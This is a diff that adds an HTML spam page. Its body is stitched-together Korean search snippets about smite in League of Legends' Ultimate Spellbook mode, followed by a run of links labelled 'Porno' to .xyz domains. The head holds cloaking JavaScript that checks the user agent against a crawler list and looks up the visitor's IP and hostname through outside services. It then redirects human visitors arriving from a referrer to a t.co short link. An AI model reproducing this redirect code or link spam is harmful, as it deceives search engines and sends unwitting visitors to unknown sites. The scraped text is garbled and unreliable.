@@ -1,0 +1,75 @@
+
+<html>
+<head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CE934VD9JW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CE934VD9JW');
+</script>
+
+	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+function isCrawler() {
+	var botPattern = "(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
+	var re = new RegExp(botPattern, 'i');
+	var userAgent = navigator.userAgent;
+	if (re.test(userAgent)) {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+function get_ip() {
+	var value = $.ajax({
+		url: 'https://api.ipify.org/?format=json',
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+function gethostbyname() {
+	var value = $.ajax({
+		url: "https://get.geojs.io/v1/dns/ptr.json",
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+var real_ip = get_ip().ip;
+var hostname = gethostbyname().ptr;
+
+
+function is_google() {
+	if (hostname.indexOf(".google.com") != '-1' || hostname.indexOf(".googlebot.com") != '-1') {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+//search zone start//
+if (is_google() == false) {
+	if (document.referrer) {
+		if (isCrawler() != true && is_google() != true) {
+            window.location="https://t.co/8yIHdLe9bL"; 
+
+		}
+	}
+}
+//search zone finish//
+</script>
+<title>4464</title>
+</script>
+</head>
+<body>
+<h1>궁극기 주문서 강타</h1>
+<p>2021-11-22 — 오랫동안 강타 카운트 다 못까면 버그때문인지 강타 처형도 안터지고 카운트도 안줄게됨;. 이거 왜 그런지 아는사람있음?2023-03-30 — 흡수했을 때 자동 강타로 업그레이드 된다. 에픽 몬스터, 바위 게, 아군 진영의 블루/레드가 일정 체력이 될때 평타를 치면 자동으로 사용되어 즉시 처형 ...ㅇㅇ 강타 써질 피일때 평타를 치면 강타가 써지는데, 이게 평타를 때려서 강타 써질 피가 되면 강타를 안 쓰는 거 같음. 펼쳐보기▽.원래 궁극기 주문서 모드에서 정글은 강타말고 스펠을 들수가 없는데 op.gg 스펠 바꿔주면 플,강타가 들리는데 그때 강타와 플래시 위치를 바꾸면 강타가 안들리고 ...저거 정글에서 얘를들어 리신하면 강타 패시브(스킬셋위에 강타사용 가능)는 들어오고 점멸 쓸수있음 정글템은 살수있고 경험치는 들어오는지 의문. Report reply궁극기 주문서 모드의 정글러는 '흑요석 검' 이라는 전용 정글 아이템만을 사용할 수 있으며, 가격은 타 정글템과 같은 350원입니다. 이 강타는 대상 정글 몬스터의 HP가 ...자동 강타는 바위게, 아군 버프, 에픽 몬스터에게 적용되며 흑요석 검이라는 정글 아이템을 통해 사용할 수 있습니다. 5회 사용시 흡수되는 것은 동일합니다. 그런데 이거 ...2022-07-16 — 이로운 효과를 부여받는 레드와 블루 에픽 몬스터에게 자동 강타가 사용됩니다. 또 정글 사냥꾼은 다른 적 챔피언을 상대할 수 없죠. 자동으로 되면서 ...2023-03-30 — 정글 역할군으로 배치되면 자동 흑요석 강타를 획득합니다. 푸른 파수꾼, 붉은 덩굴정령, 협곡 바위 게 또는 에픽 몬스터를 공격할 때 해당 몬스터의 체력 ...2022-07-18 — 처음 블루 먹을때 블루 딸피일때 e쓰닌깐 강타가 스택이 2개 남음.2021-06-12 — 현재 정글 포지션의 소환사 주문은 강타와 궁극기 슬롯밖에 없습니다. (정글 제외 다른 포지션은 강타 빼고 소환사 주문 존재). ○ 게임에 들어가면 아래 ...2021-07-18 — 롤,리그오브레전드,모드,우르프,게임모드,신규패치,궁극기주문서모드, ... 은 강타만 가질 수 있으며 첫 시작 시 레벨 3으로 시작하고 3개의 궁극기 ...2022-07-12 — 2022년 7월 16일 궁극기 주문서 업데이트 및 게임 모드 정보 ... 이제 공격-강타 사용자가 제단을 나서면 일반 강타와 공격-강타의 차이점을 안내하는 ...아이번 궁극기 주문서 모드. ㅇㅇ(180.66); 2021.12.01 13:17. 조회수 378; 추천 0; 댓글 0. 79ee8175b19c28a8699fe8b115ef046e16063a4ee9. 자동강타 써지냐? 추천검색.궁극기 주문서는 스펠 1개를 궁극기로 바꿀 수 있어 스펠은 1개만 선택 가능합니다 원래 점화,텔포,정화 다 있는데 정글 라인 은 강타만 선택 가능합니다 ㅠ 존재하지 ...prieš 5 dienas — 리그 오브 레전드/룬/영감 - 나무위키 궁극기 주문서 - 나무위키:대문 당시에는 스타판에서의 조작 게임 논란처럼 롤판이 엎어질 수 있다고 10 패치가 ...prieš 4 valandas — 소환사 주문 강타 점멸. ... 솔라리 미드 아이번 – YouTube 궁극기 주문서 아이번 – 룬, 챔피언 분석 :: 롤 전적 검색 – 포로지지 …아이번'의 빌드 ...2021-06-16 — 롤은 소환사의 협곡, 칼바람 나락(무작위 총력전), 전략적 팀 전투 등 여러 모드들이 존재합니다. 그중에서도 이벤트성으로 일시적으로 진행되는 모드 ...prieš 1 valandą — 소환사의 협곡 리신은 점멸과 강타를 사용했다면 칼바람 리신은 점멸과 ... 전 소환사의 협곡 · 칼바람 나락 · 궁극기 주문서 칼바람 장인이 알려주 ...2023-04-07 — 소환사의 협곡, 칼바람 나락, 우르프, 돌격 넥서스, 궁극기 주문서 모드 등 리그 오브 레전드의 모든 게임 모드 챔피언 분석과 소환사 전적검색을 ...<a href="https://soktumun.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fremon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freejon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://memcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dilaracuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dudikli.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://haruncuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freefon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://duraman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeeon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fittirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://furtuni.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://supersan.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://saklaman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeron.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freecon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://yuppik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freenon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://sirikim.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://cemcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dandirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a></p>
+</body>
+</html>
+    
